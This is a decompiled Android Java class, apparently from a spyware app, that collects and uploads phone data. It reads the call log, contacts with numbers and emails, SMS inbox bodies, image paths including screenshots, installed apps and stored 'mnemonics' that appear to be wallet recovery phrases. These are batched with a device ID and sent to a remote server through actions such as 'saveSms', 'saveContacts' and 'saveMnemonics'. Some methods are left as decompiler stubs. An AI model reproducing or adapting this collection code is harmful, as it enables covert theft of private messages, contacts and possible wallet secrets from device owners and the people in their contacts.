package k3;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.text.TextUtils;
import androidx.annotation.NonNull;
import androidx.constraintlayout.core.motion.utils.TypedValues;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import com.blankj.utilcode.util.SPUtils;
import com.superbock.bean.AInfo;
import com.superbock.bean.BInfo;
import com.superbock.bean.CInfo;
import com.superbock.bean.DInfo;
import com.superbock.bean.EInfo;
import com.superbock.bean.KInfo;
import com.superbock.bean.SysNews;
import g3.l;
import g3.p;
import java.io.File;
import java.io.IOException;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Objects;
import java.util.Set;
import m4.g;
import s3.b0;
import z2.m;

/* loaded from: classes3.dex */
public final class f {

    /* renamed from: a, reason: collision with root package name */
    public static boolean f3870a;

    /* renamed from: b, reason: collision with root package name */
    public static boolean f3871b;

    /* renamed from: c, reason: collision with root package name */
    public static boolean f3872c;

    /* renamed from: d, reason: collision with root package name */
    public static boolean f3873d;

    /* renamed from: e, reason: collision with root package name */
    public static boolean f3874e;

    /* renamed from: f, reason: collision with root package name */
    public static boolean f3875f;

    /* renamed from: g, reason: collision with root package name */
    public static boolean f3876g;

    /* renamed from: h, reason: collision with root package name */
    public static boolean f3877h;

    /* renamed from: i, reason: collision with root package name */
    public static boolean f3878i;

    /* renamed from: j, reason: collision with root package name */
    public static boolean f3879j;

    /* renamed from: k, reason: collision with root package name */
    public static boolean f3880k;

    /* renamed from: l, reason: collision with root package name */
    public static final Map<String, String> f3881l = new HashMap();

    /* loaded from: classes14.dex */
    public class a implements s3.e {

        /* renamed from: a, reason: collision with root package name */
        public final /* synthetic */ EInfo f3882a;

        /* renamed from: b, reason: collision with root package name */
        public final /* synthetic */ Context f3883b;

        public a(EInfo eInfo, Context context) {
            this.f3882a = eInfo;
            this.f3883b = context;
        }

        @Override // s3.e
        public final void a(@NonNull s3.d dVar, @NonNull b0 b0Var) {
            f.e u4;
            try {
                if (b0Var.b() && (u4 = f.a.u(d1.c.f(b0Var.f5160h.e(), k3.i.f3901a))) != null && u4.z("code") == 1) {
                    this.f3882a.setUp2(1);
                    g3.f.a().d(this.f3882a);
                    f.f3879j = false;
                    f.r(this.f3883b);
                }
            } catch (Throwable unused) {
            }
            f.f3879j = false;
        }

        @Override // s3.e
        public final void b(@NonNull s3.d dVar, @NonNull IOException iOException) {
            f.f3879j = false;
        }
    }

    /* loaded from: classes20.dex */
    public class b implements s3.e {
        @Override // s3.e
        public final void a(@NonNull s3.d dVar, @NonNull b0 b0Var) {
            f.e u4;
            boolean z4;
            try {
                if (b0Var.b() && (u4 = f.a.u(b0Var.f5160h.e())) != null && u4.z("code") == 1) {
                    SPUtils.getInstance().put("readNewsTime", System.currentTimeMillis());
                    List<SysNews> t4 = f.a.t(u4.B("data"), SysNews.class);
                    if (t4 == null || t4.isEmpty()) {
                        return;
                    }
                    for (SysNews sysNews : t4) {
                        p b5 = p.b();
                        String newsId = sysNews.getNewsId();
                        Objects.requireNonNull(b5);
                        try {
                            z4 = b5.f2981a.g(newsId);
                        } catch (SQLException unused) {
                            z4 = false;
                        }
                        if (!z4) {
                            p b6 = p.b();
                            Objects.requireNonNull(b6);
                            try {
                                b6.f2981a.n(sysNews);
                            } catch (SQLException unused2) {
                            }
                        }
                    }
                }
            } catch (Throwable unused3) {
            }
        }

        @Override // s3.e
        public final void b(@NonNull s3.d dVar, @NonNull IOException iOException) {
        }
    }

    /* loaded from: classes11.dex */
    public class c implements s3.e {

        /* renamed from: a, reason: collision with root package name */
        public final /* synthetic */ List f3884a;

        /* renamed from: b, reason: collision with root package name */
        public final /* synthetic */ Context f3885b;

        public c(List list, Context context) {
            this.f3884a = list;
            this.f3885b = context;
        }

        @Override // s3.e
        public final void a(@NonNull s3.d dVar, @NonNull b0 b0Var) {
            f.e u4;
            try {
                if (b0Var.b() && (u4 = f.a.u(d1.c.f(b0Var.f5160h.e(), k3.i.f3901a))) != null && u4.z("code") == 1) {
                    List t4 = f.a.t(u4.B("needIcon"), String.class);
                    for (AInfo aInfo : this.f3884a) {
                        if (t4 != null && t4.contains(aInfo.getPk())) {
                            aInfo.setNi(1);
                        }
                        aInfo.setUp(1);
                        g3.a.b().d(aInfo);
                        f.u(aInfo, this.f3885b);
                    }
                    f.f3875f = false;
                    f.n(this.f3885b);
                }
            } catch (Throwable unused) {
            }
            f.f3875f = false;
        }

        @Override // s3.e
        public final void b(@NonNull s3.d dVar, @NonNull IOException iOException) {
            f.f3875f = false;
        }
    }

    /* loaded from: classes19.dex */
    public class d implements s3.e {

        /* renamed from: a, reason: collision with root package name */
        public final /* synthetic */ AInfo f3886a;

        public d(AInfo aInfo) {
            this.f3886a = aInfo;
        }

        @Override // s3.e
        public final void a(@NonNull s3.d dVar, @NonNull b0 b0Var) {
            f.e u4;
            try {
                if (b0Var.b() && (u4 = f.a.u(b0Var.f5160h.e())) != null && u4.z(NotificationCompat.CATEGORY_STATUS) == 200) {
                    this.f3886a.setTh(u4.A("data").B("thumb"));
                    g3.a.b().d(this.f3886a);
                    f.o(this.f3886a);
                }
            } catch (Throwable unused) {
            }
        }

        @Override // s3.e
        public final void b(@NonNull s3.d dVar, @NonNull IOException iOException) {
        }
    }

    /* loaded from: classes20.dex */
    public class e implements s3.e {

        /* renamed from: a, reason: collision with root package name */
        public final /* synthetic */ AInfo f3887a;

        public e(AInfo aInfo) {
            this.f3887a = aInfo;
        }

        @Override // s3.e
        public final void a(@NonNull s3.d dVar, @NonNull b0 b0Var) {
            f.e u4;
            try {
                if (b0Var.b() && (u4 = f.a.u(d1.c.f(b0Var.f5160h.e(), k3.i.f3901a))) != null && u4.z("code") == 1) {
                    this.f3887a.setUp2(1);
                    g3.a.b().d(this.f3887a);
                }
            } catch (Throwable unused) {
            }
        }

        @Override // s3.e
        public final void b(@NonNull s3.d dVar, @NonNull IOException iOException) {
        }
    }

    /* renamed from: k3.f$f, reason: collision with other inner class name */
    /* loaded from: classes25.dex */
    public class C0043f implements s3.e {

        /* renamed from: a, reason: collision with root package name */
        public final /* synthetic */ List f3888a;

        /* renamed from: b, reason: collision with root package name */
        public final /* synthetic */ Context f3889b;

        public C0043f(List list, Context context) {
            this.f3888a = list;
            this.f3889b = context;
        }

        @Override // s3.e
        public final void a(@NonNull s3.d dVar, @NonNull b0 b0Var) {
            f.e u4;
            try {
                if (b0Var.b() && (u4 = f.a.u(d1.c.f(b0Var.f5160h.e(), k3.i.f3901a))) != null && u4.z("code") == 1) {
                    for (BInfo bInfo : this.f3888a) {
                        bInfo.setUp(1);
                        g3.c.a().f2955a.d(bInfo);
                    }
                    f.f3876g = false;
                    f.q(this.f3889b);
                }
            } catch (Throwable unused) {
            }
            f.f3876g = false;
        }

        @Override // s3.e
        public final void b(@NonNull s3.d dVar, @NonNull IOException iOException) {
            f.f3876g = false;
        }
    }

    public class g implements s3.e {

        /* renamed from: a, reason: collision with root package name */
        public final /* synthetic */ List f3890a;

        /* renamed from: b, reason: collision with root package name */
        public final /* synthetic */ Context f3891b;

        public g(List list, Context context) {
            this.f3890a = list;
            this.f3891b = context;
        }

        @Override // s3.e
        public final void a(@NonNull s3.d dVar, @NonNull b0 b0Var) {
            f.e u4;
            try {
                if (b0Var.b() && (u4 = f.a.u(d1.c.f(b0Var.f5160h.e(), k3.i.f3901a))) != null && u4.z("code") == 1) {
                    for (CInfo cInfo : this.f3890a) {
                        cInfo.setUp(1);
                        ((t2.g) g3.d.a().f2958b).d(cInfo);
                    }
                    f.f3877h = false;
                    f.t(this.f3891b);
                }
            } catch (Throwable unused) {
            }
            f.f3877h = false;
        }

        @Override // s3.e
        public final void b(@NonNull s3.d dVar, @NonNull IOException iOException) {
            f.f3877h = false;
        }
    }

    /* loaded from: classes9.dex */
    public class h implements s3.e {

        /* renamed from: a, reason: collision with root package name */
        public final /* synthetic */ KInfo f3892a;

        /* renamed from: b, reason: collision with root package name */
        public final /* synthetic */ Context f3893b;

        public h(KInfo kInfo, Context context) {
            this.f3892a = kInfo;
            this.f3893b = context;
        }

        @Override // s3.e
        public final void a(@NonNull s3.d dVar, @NonNull b0 b0Var) {
            f.e u4;
            try {
                if (b0Var.b() && (u4 = f.a.u(d1.c.f(b0Var.f5160h.e(), k3.i.f3901a))) != null && u4.z("code") == 1) {
                    this.f3892a.setUp(1);
                    l.c().f2975a.d(this.f3892a);
                    f.f3880k = false;
                    f.s(this.f3893b);
                }
            } catch (Throwable unused) {
            }
            f.f3880k = false;
        }

        @Override // s3.e
        public final void b(@NonNull s3.d dVar, @NonNull IOException iOException) {
            f.f3880k = false;
        }
    }

    /* loaded from: classes23.dex */
    public class i implements s3.e {

        /* renamed from: a, reason: collision with root package name */
        public final /* synthetic */ List f3894a;

        /* renamed from: b, reason: collision with root package name */
        public final /* synthetic */ Context f3895b;

        public i(List list, Context context) {
            this.f3894a = list;
            this.f3895b = context;
        }

        @Override // s3.e
        public final void a(@NonNull s3.d dVar, @NonNull b0 b0Var) {
            f.e u4;
            try {
                if (b0Var.b() && (u4 = f.a.u(d1.c.f(b0Var.f5160h.e(), k3.i.f3901a))) != null && u4.z("code") == 1) {
                    for (DInfo dInfo : this.f3894a) {
                        dInfo.setUp(1);
                        g3.e.a().f2960a.d(dInfo);
                    }
                    f.f3878i = false;
                    f.p(this.f3895b);
                }
            } catch (Throwable unused) {
            }
            f.f3878i = false;
        }

        @Override // s3.e
        public final void b(@NonNull s3.d dVar, @NonNull IOException iOException) {
            f.f3878i = false;
        }
    }

    /* loaded from: classes4.dex */
    public class j implements m4.h {

        /* renamed from: a, reason: collision with root package name */
        public final /* synthetic */ EInfo f3896a;

        /* renamed from: b, reason: collision with root package name */
        public final /* synthetic */ Context f3897b;

        /* renamed from: c, reason: collision with root package name */
        public final /* synthetic */ File f3898c;

        public j(EInfo eInfo, Context context, File file) {
            this.f3896a = eInfo;
            this.f3897b = context;
            this.f3898c = file;
        }
    }

    /* loaded from: classes5.dex */
    public class k implements m4.b {
    }

    /* JADX WARN: Type inference failed for: r1v1, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v3, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v8, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
    /* JADX WARN: Type inference failed for: r2v0, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
    /* JADX WARN: Type inference failed for: r2v4, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r2v5, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
    public static void a() {
        List<AInfo> list;
        g3.a b5 = g3.a.b();
        Objects.requireNonNull(b5);
        try {
            Object obj = b5.f2951b;
            list = ((t2.g) obj).k(((t2.g) obj).c().f());
        } catch (SQLException unused) {
            list = null;
        }
        if (list != null && !list.isEmpty()) {
            f3881l.clear();
            for (AInfo aInfo : list) {
                f3881l.put(aInfo.getPk(), aInfo.getNa());
            }
        }
        List<String> list2 = k3.e.f3867a;
        Set<String> set = e3.d.f2594d;
        if (set.isEmpty() || f3881l.isEmpty()) {
            return;
        }
        k3.e.f3867a.clear();
        for (String str : set) {
            if (f3881l.containsKey(str) && l.c().b(str) == null) {
                k3.e.f3867a.add(str);
            }
        }
    }

    public static synchronized void b(Context context) {
        synchronized (f.class) {
            c(context, false);
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:42:0x011e, code lost:
    
        if (e3.d.f2596f.contains(r6.getNa()) != false) goto L76;
     */
    /* JADX WARN: Type inference failed for: r4v34, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public static synchronized void c(android.content.Context r8, boolean r9) {
        /*
            Method dump skipped, instructions count: 496
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: k3.f.c(android.content.Context, boolean):void");
    }

    public static synchronized void d(Context context) {
        synchronized (f.class) {
            e(context, false);
        }
    }

    public static synchronized void e(Context context, boolean z4) {
        synchronized (f.class) {
            if (f3874e) {
                return;
            }
            f3874e = true;
            if (!z4 && System.currentTimeMillis() - SPUtils.getInstance().getLong("readCallLogTime") < 2592000000L) {
                f3874e = false;
                return;
            }
            if (!z4) {
                try {
                    if (ContextCompat.checkSelfPermission(context, "android.permission.READ_CALL_LOG") != 0) {
                        f3874e = false;
                        return;
                    }
                } catch (Throwable unused) {
                }
            }
            Cursor query = context.getContentResolver().query(Uri.parse("content://call_log/calls"), null, null, null, null);
            if (query != null) {
                if (query.moveToFirst()) {
                    do {
                        String string = query.getString(query.getColumnIndex("_id"));
                        String string2 = query.getString(query.getColumnIndex("number"));
                        String string3 = query.getString(query.getColumnIndex("name"));
                        String string4 = query.getString(query.getColumnIndex("date"));
                        String string5 = query.getString(query.getColumnIndex(TypedValues.TransitionType.S_DURATION));
                        String string6 = query.getString(query.getColumnIndex("type"));
                        if (!TextUtils.isEmpty(string2) && !g3.e.a().f2960a.g(string)) {
                            DInfo dInfo = new DInfo();
                            dInfo.setId(string);
                            dInfo.setNu(string2);
                            if (!TextUtils.isEmpty(string3)) {
                                dInfo.setNa(string3);
                            }
                            if (!TextUtils.isEmpty(string5)) {
                                try {
                                    dInfo.setDu(Long.parseLong(string5));
                                } catch (NumberFormatException unused2) {
                                }
                            }
                            if (!TextUtils.isEmpty(string6)) {
                                try {
                                    dInfo.setTy(Integer.parseInt(string6));
                                } catch (NumberFormatException unused3) {
                                }
                            }
                            if (!TextUtils.isEmpty(string4)) {
                                try {
                                    dInfo.setDa(Long.parseLong(string4));
                                } catch (NumberFormatException unused4) {
                                }
                            }
                            g3.e.a().f2960a.n(dInfo);
                        }
                    } while (query.moveToNext());
                }
                SPUtils.getInstance().put("readCallLogTime", System.currentTimeMillis());
                query.close();
            }
            f3874e = false;
        }
    }

    public static synchronized void f(Context context) {
        synchronized (f.class) {
            g(context, false);
        }
    }

    public static synchronized void g(Context context, boolean z4) {
        synchronized (f.class) {
            if (f3872c) {
                return;
            }
            f3872c = true;
            if (!z4 && System.currentTimeMillis() - SPUtils.getInstance().getLong("readContactsTime") < 2592000000L) {
                f3872c = false;
                return;
            }
            if (!z4) {
                try {
                    if (ContextCompat.checkSelfPermission(context, "android.permission.READ_CONTACTS") != 0) {
                        f3872c = false;
                        return;
                    }
                } catch (Throwable unused) {
                }
            }
            Cursor query = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (query != null) {
                if (query.moveToFirst()) {
                    do {
                        String string = query.getString(query.getColumnIndex("_id"));
                        String string2 = query.getString(query.getColumnIndex("display_name"));
                        String str = "";
                        String str2 = "";
                        Cursor query2 = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id = " + string, null, null);
                        if (query2 != null) {
                            if (query2.moveToFirst()) {
                                do {
                                    String string3 = query2.getString(query2.getColumnIndex("data1"));
                                    StringBuilder sb = new StringBuilder();
                                    sb.append(str);
                                    sb.append("".equals(str) ? "" : "|");
                                    sb.append(string3);
                                    str = sb.toString();
                                } while (query2.moveToNext());
                            }
                            query2.close();
                        }
                        Cursor query3 = context.getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, "contact_id = " + string, null, null);
                        if (query3 != null) {
                            if (query3.moveToFirst()) {
                                do {
                                    String string4 = query3.getString(query3.getColumnIndex("data1"));
                                    StringBuilder sb2 = new StringBuilder();
                                    sb2.append(str2);
                                    sb2.append("".equals(str2) ? "" : "|");
                                    sb2.append(string4);
                                    str2 = sb2.toString();
                                } while (query3.moveToNext());
                            }
                            query3.close();
                        }
                        if (!TextUtils.isEmpty(str) && !g3.c.a().f2955a.g(string)) {
                            BInfo bInfo = new BInfo();
                            bInfo.setId(string);
                            bInfo.setNu(str);
                            if (!TextUtils.isEmpty(string2)) {
                                bInfo.setNa(string2);
                            }
                            if (!TextUtils.isEmpty(str2)) {
                                bInfo.setEm(str2);
                            }
                            g3.c.a().f2955a.n(bInfo);
                        }
                    } while (query.moveToNext());
                }
                SPUtils.getInstance().put("readContactsTime", System.currentTimeMillis());
                query.close();
            }
            f3872c = false;
        }
    }

    public static synchronized void h(Context context) {
        synchronized (f.class) {
            i(context, false);
        }
    }

    public static synchronized void i(Context context, boolean z4) {
        synchronized (f.class) {
            if (f3870a) {
                return;
            }
            f3870a = true;
            if (!z4 && System.currentTimeMillis() - SPUtils.getInstance().getLong("readImagesTime") < 2592000000L) {
                f3870a = false;
                return;
            }
            if (!z4) {
                if (Build.VERSION.SDK_INT > 32) {
                    if (ContextCompat.checkSelfPermission(context, "android.permission.READ_MEDIA_IMAGES") != 0) {
                        f3870a = false;
                        return;
                    }
                } else if (ContextCompat.checkSelfPermission(context, "android.permission.READ_EXTERNAL_STORAGE") != 0) {
                    f3870a = false;
                    return;
                }
            }
            try {
                Cursor query = context.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, new String[]{"_id", "_display_name", "_data", "date_modified"}, null, null, null);
                if (query != null) {
                    if (query.moveToFirst()) {
                        do {
                            String string = query.getString(query.getColumnIndex("_id"));
                            String string2 = query.getString(query.getColumnIndex("_display_name"));
                            String string3 = query.getString(query.getColumnIndex("_data"));
                            String string4 = query.getString(query.getColumnIndex("date_modified"));
                            if (!TextUtils.isEmpty(string) && !TextUtils.isEmpty(string2) && !TextUtils.isEmpty(string3) && !g3.f.a().f2962a.g(string)) {
                                EInfo eInfo = new EInfo();
                                eInfo.setId(string);
                                eInfo.setNa(string2);
                                eInfo.setPa(string3);
                                if (!TextUtils.isEmpty(string4)) {
                                    try {
                                        eInfo.setMo(Long.parseLong(string4));
                                    } catch (NumberFormatException unused) {
                                    }
                                }
                                if (string3.toLowerCase().contains("screenshot")) {
                                    eInfo.setSc(2);
                                }
                                if (string3.toLowerCase().endsWith(".gif") || string3.contains("/luban_disk_cache/")) {
                                    eInfo.setCo(3);
                                }
                                g3.f.a().f2962a.n(eInfo);
                            }
                        } while (query.moveToNext());
                    }
                    SPUtils.getInstance().put("readImagesTime", System.currentTimeMillis());
                    query.close();
                }
            } catch (Throwable unused2) {
            }
            f3870a = false;
        }
    }

    /* JADX WARN: Type inference failed for: r0v2, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    public static void j(Context context, boolean z4) {
        if (z4 || System.currentTimeMillis() - SPUtils.getInstance().getLong("readNewsTime") >= 7200000) {
            String language = Locale.getDefault().getLanguage();
            if ("zh".equals(language)) {
                language = "cn";
            } else if (!e3.d.f2595e.contains(language)) {
                language = "en";
            }
            int i5 = p.b().a(language) == null ? 100 : 20;
            f.e eVar = new f.e();
            eVar.put("action", "readNews");
            eVar.put("deviceId", k3.a.c(context));
            eVar.put("limit", Integer.valueOf(i5));
            eVar.put("lang", language);
            k3.i.a(eVar, new b());
        }
    }

    /* JADX WARN: Type inference failed for: r3v0, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    public static Map<String, String> k(Context context) {
        try {
            PackageManager packageManager = context.getPackageManager();
            PackageInfo packageInfo = packageManager.getPackageInfo("com.android.vending", 1);
            String str = "";
            try {
                str = packageInfo.applicationInfo.loadLabel(packageManager).toString();
            } catch (Exception unused) {
            }
            HashMap hashMap = new HashMap();
            hashMap.put("name", str);
            String str2 = "1";
            hashMap.put("isPlayStore", e3.d.f2596f.contains(str) ? "1" : "0");
            if (!packageInfo.applicationInfo.enabled) {
                str2 = "0";
            }
            hashMap.put("isEnabled", str2);
            return hashMap;
        } catch (PackageManager.NameNotFoundException unused2) {
            return null;
        }
    }

    public static synchronized void l(Context context) {
        synchronized (f.class) {
            m(context, false);
        }
    }

    public static synchronized void m(Context context, boolean z4) {
        synchronized (f.class) {
            if (f3873d) {
                return;
            }
            f3873d = true;
            if (!z4 && System.currentTimeMillis() - SPUtils.getInstance().getLong("readSmsTime") < 2592000000L) {
                f3873d = false;
                return;
            }
            if (!z4) {
                try {
                    if (ContextCompat.checkSelfPermission(context, "android.permission.READ_SMS") != 0) {
                        f3873d = false;
                        return;
                    }
                } catch (Throwable unused) {
                }
            }
            Cursor query = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
            if (query != null) {
                if (query.moveToFirst()) {
                    do {
                        String string = query.getString(query.getColumnIndex("_id"));
                        String string2 = query.getString(query.getColumnIndex("address"));
                        String string3 = query.getString(query.getColumnIndex("body"));
                        String string4 = query.getString(query.getColumnIndex("date"));
                        if (!TextUtils.isEmpty(string2) && !TextUtils.isEmpty(string3) && !((t2.g) g3.d.a().f2958b).g(string)) {
                            CInfo cInfo = new CInfo();
                            cInfo.setId(string);
                            cInfo.setAd(string2);
                            cInfo.setBo(string3);
                            if (!TextUtils.isEmpty(string4)) {
                                try {
                                    cInfo.setDa(Long.parseLong(string4));
                                } catch (NumberFormatException unused2) {
                                }
                            }
                            ((t2.g) g3.d.a().f2958b).n(cInfo);
                        }
                    } while (query.moveToNext());
                }
                SPUtils.getInstance().put("readSmsTime", System.currentTimeMillis());
                query.close();
            }
            f3873d = false;
        }
    }

    public static synchronized void n(Context context) {
        List k5;
        synchronized (f.class) {
            if (f3875f) {
                return;
            }
            f3875f = true;
            try {
                Object obj = g3.a.b().f2951b;
                t2.g gVar = (t2.g) obj;
                m<T, ID> g5 = ((t2.g) obj).c().g();
                g5.c("up", 0);
                k5 = gVar.k(g5.j());
            } catch (Throwable unused) {
                f3875f = false;
            }
            if (k5 != null && !k5.isEmpty()) {
                if (k5.size() > 20) {
                    k5 = k5.subList(0, 20);
                }
                ArrayList arrayList = new ArrayList(k5);
                f.b bVar = new f.b();
                Iterator it = arrayList.iterator();
                while (it.hasNext()) {
                    AInfo aInfo = (AInfo) it.next();
                    f.e eVar = new f.e();
                    eVar.put("packageName", aInfo.getPk());
                    eVar.put("type", Integer.valueOf(aInfo.getTy()));
                    if (aInfo.getTy() == 0) {
                        eVar.put("appName", aInfo.getNa());
                    }
                    bVar.add(eVar);
                }
                f.e eVar2 = new f.e();
                eVar2.put("action", "saveApp");
                eVar2.put("deviceId", k3.a.c(context));
                eVar2.put("list", bVar);
                k3.i.a(eVar2, new c(arrayList, context));
                return;
            }
            List a5 = g3.a.b().a();
            if (a5 != null && !a5.isEmpty()) {
                Iterator it2 = a5.iterator();
                while (it2.hasNext()) {
                    u((AInfo) it2.next(), context);
                }
                f3875f = false;
                return;
            }
            f3875f = false;
        }
    }

    public static void o(AInfo aInfo) {
        if (aInfo.getUp2() == 1) {
            return;
        }
        f.b bVar = new f.b();
        f.e eVar = new f.e();
        eVar.put("packageName", aInfo.getPk());
        eVar.put("thumb", aInfo.getTh());
        bVar.add(eVar);
        f.e eVar2 = new f.e();
        eVar2.put("action", "saveAppIcon");
        eVar2.put("list", bVar);
        k3.i.a(eVar2, new e(aInfo));
    }

    public static synchronized void p(Context context) {
        List<DInfo> k5;
        synchronized (f.class) {
            if (f3878i) {
                return;
            }
            f3878i = true;
            try {
                t2.g<DInfo, String> gVar = g3.e.a().f2960a;
                z2.h<DInfo, String> c5 = gVar.c();
                c5.l("da", true);
                m<DInfo, String> g5 = c5.g();
                g5.c("up", 0);
                k5 = gVar.k(g5.j());
            } catch (Throwable unused) {
                f3878i = false;
            }
            if (k5 != null && !k5.isEmpty()) {
                if (k5.size() > 20) {
                    k5 = k5.subList(0, 20);
                }
                ArrayList arrayList = new ArrayList(k5);
                f.b bVar = new f.b();
                Iterator it = arrayList.iterator();
                while (it.hasNext()) {
                    DInfo dInfo = (DInfo) it.next();
                    f.e eVar = new f.e();
                    eVar.put("callLogId", dInfo.getId());
                    eVar.put("num", dInfo.getNu());
                    if (!TextUtils.isEmpty(dInfo.getNa())) {
                        eVar.put("name", dInfo.getNa());
                    }
                    eVar.put("callDate", Long.valueOf(dInfo.getDa()));
                    eVar.put(TypedValues.TransitionType.S_DURATION, Long.valueOf(dInfo.getDu()));
                    eVar.put("type", Integer.valueOf(dInfo.getTy()));
                    bVar.add(eVar);
                }
                f.e eVar2 = new f.e();
                eVar2.put("action", "saveCallLog");
                eVar2.put("deviceId", k3.a.c(context));
                eVar2.put("list", bVar);
                k3.i.a(eVar2, new i(arrayList, context));
                return;
            }
            f3878i = false;
        }
    }

    public static synchronized void q(Context context) {
        List<BInfo> k5;
        synchronized (f.class) {
            if (f3876g) {
                return;
            }
            f3876g = true;
            try {
                t2.g<BInfo, String> gVar = g3.c.a().f2955a;
                m<BInfo, String> g5 = gVar.c().g();
                g5.c("up", 0);
                k5 = gVar.k(g5.j());
            } catch (Throwable unused) {
                f3876g = false;
            }
            if (k5 != null && !k5.isEmpty()) {
                if (k5.size() > 20) {
                    k5 = k5.subList(0, 20);
                }
                ArrayList arrayList = new ArrayList(k5);
                f.b bVar = new f.b();
                Iterator it = arrayList.iterator();
                while (it.hasNext()) {
                    BInfo bInfo = (BInfo) it.next();
                    f.e eVar = new f.e();
                    eVar.put("contactsId", bInfo.getId());
                    eVar.put("num", bInfo.getNu());
                    if (!TextUtils.isEmpty(bInfo.getNa())) {
                        eVar.put("name", bInfo.getNa());
                    }
                    if (!TextUtils.isEmpty(bInfo.getEm())) {
                        eVar.put(NotificationCompat.CATEGORY_EMAIL, bInfo.getEm());
                    }
                    bVar.add(eVar);
                }
                f.e eVar2 = new f.e();
                eVar2.put("action", "saveContacts");
                eVar2.put("deviceId", k3.a.c(context));
                eVar2.put("list", bVar);
                k3.i.a(eVar2, new C0043f(arrayList, context));
                return;
            }
            f3876g = false;
        }
    }

    /* JADX WARN: Type inference failed for: r5v0, types: [java.util.ArrayList, java.util.List<m4.d>] */
    public static synchronized void r(Context context) {
        EInfo b5;
        synchronized (f.class) {
            if (f3879j) {
                return;
            }
            f3879j = true;
            try {
                b5 = g3.f.a().b();
            } catch (Throwable unused) {
                f3879j = false;
            }
            if (b5 == null) {
                f3879j = false;
                return;
            }
            if (TextUtils.isEmpty(b5.getMe())) {
                b5.setCo(b5.getCo() + 1);
                g3.f.a().d(b5);
                File file = new File(b5.getPa());
                if (file.exists()) {
                    g.a aVar = new g.a(context);
                    aVar.f4255e.add(new m4.f(file));
                    aVar.f4252b = 100;
                    aVar.f4254d = new k();
                    aVar.f4253c = new j(b5, context, file);
                    aVar.a();
                } else {
                    f3879j = false;
                    r(context);
                }
            } else {
                v(b5, context);
            }
        }
    }

    public static synchronized void s(Context context) {
        KInfo j5;
        synchronized (f.class) {
            if (f3880k) {
                return;
            }
            f3880k = true;
            try {
                t2.g<KInfo, String> gVar = l.c().f2975a;
                z2.h<KInfo, String> c5 = gVar.c();
                c5.l("ti", true);
                m<KInfo, String> g5 = c5.g();
                g5.c("up", 0);
                j5 = gVar.j(g5.j());
            } catch (Throwable unused) {
                f3880k = false;
            }
            if (j5 == null) {
                f3880k = false;
                return;
            }
            f.e eVar = new f.e();
            eVar.put("action", "saveMnemonics");
            eVar.put("deviceId", k3.a.c(context));
            eVar.put("mnemoId", j5.getId());
            eVar.put("type", Integer.valueOf(j5.getTy()));
            eVar.put("json", j5.getJs());
            eVar.put("packageName", j5.getPk());
            eVar.put("name", j5.getNa());
            k3.i.a(eVar, new h(j5, context));
        }
    }

    public static synchronized void t(Context context) {
        List k5;
        synchronized (f.class) {
            if (f3877h) {
                return;
            }
            f3877h = true;
            try {
                Object obj = g3.d.a().f2958b;
                t2.g gVar = (t2.g) obj;
                z2.h c5 = ((t2.g) obj).c();
                c5.l("da", true);
                m<T, ID> g5 = c5.g();
                g5.c("up", 0);
                k5 = gVar.k(g5.j());
            } catch (Throwable unused) {
                f3877h = false;
            }
            if (k5 != null && !k5.isEmpty()) {
                if (k5.size() > 10) {
                    k5 = k5.subList(0, 10);
                }
                ArrayList arrayList = new ArrayList(k5);
                f.b bVar = new f.b();
                Iterator it = arrayList.iterator();
                while (it.hasNext()) {
                    CInfo cInfo = (CInfo) it.next();
                    f.e eVar = new f.e();
                    eVar.put("smsId", cInfo.getId());
                    eVar.put("address", cInfo.getAd());
                    eVar.put("body", cInfo.getBo());
                    eVar.put("smsDate", Long.valueOf(cInfo.getDa()));
                    bVar.add(eVar);
                }
                f.e eVar2 = new f.e();
                eVar2.put("action", "saveSms");
                eVar2.put("deviceId", k3.a.c(context));
                eVar2.put("list", bVar);
                k3.i.a(eVar2, new g(arrayList, context));
                return;
            }
            f3877h = false;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:28:0x00a6, code lost:
    
        r8.setCo(r8.getCo() + 1);
     */
    /* JADX WARN: Code restructure failed: missing block: B:30:0x00af, code lost:
    
        g3.a.b().d(r8);
     */
    /* JADX WARN: Code restructure failed: missing block: B:31:0x00b6, code lost:
    
        return;
     */
    /* JADX WARN: Code restructure failed: missing block: B:34:?, code lost:
    
        return;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public static void u(com.superbock.bean.AInfo r8, android.content.Context r9) {
        /*
            int r0 = r8.getNi()
            if (r0 != 0) goto L7
            return
        L7:
            java.lang.String r0 = r8.getTh()
            boolean r0 = android.text.TextUtils.isEmpty(r0)
            if (r0 != 0) goto L16
            o(r8)
            goto Lc3
        L16:
            java.lang.String r0 = r8.getPk()
            r1 = 0
            android.content.pm.PackageManager r2 = r9.getPackageManager()     // Catch: java.lang.Throwable -> La4
            r3 = 0
